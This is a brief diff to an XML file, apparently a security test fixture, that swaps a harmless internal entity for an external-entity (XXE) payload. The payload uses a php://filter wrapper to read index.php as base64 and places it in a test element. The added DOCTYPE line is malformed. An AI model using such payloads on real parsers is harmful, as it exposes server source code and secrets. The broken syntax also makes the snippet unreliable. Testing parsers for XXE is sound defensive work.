@@ -1,5 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE ANY [
-	<!ENTITY xxe "xxe test">
+
+<!DOCTYPE entity [
+        <!ENTITY file SYSTEM ENTITY e SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
 ]>
-<root>&xxe;</root>
+
+<test>
+	<external>&file;</external>
+</test>
